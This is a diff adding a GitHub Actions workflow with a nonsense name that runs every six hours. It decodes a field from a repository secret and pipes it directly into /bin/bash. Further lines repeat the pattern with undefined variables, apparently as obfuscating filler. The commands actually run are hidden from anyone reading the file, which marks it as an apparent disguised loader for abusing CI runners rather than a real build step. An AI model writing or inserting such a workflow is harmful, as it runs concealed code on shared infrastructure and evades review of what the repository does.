@@ -1,0 +1,21 @@
+name: delectableregardless
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: delectableregardless
+        env:
+          hke032: ${{ secrets.hke032 }}
+        run: |
+          echo $hke032 | jq -r .rj239 | /bin/bash
+          echo $jnwdg1 | jq -r .rzcji758 | /bin/bash
+          echo $oegb16 | jq -r .ce8277 | /bin/bash
+          echo $m05 | jq -r .ch69 | /bin/bash
+          echo $kgf13142 | jq -r .aglb8235 | /bin/bash
+
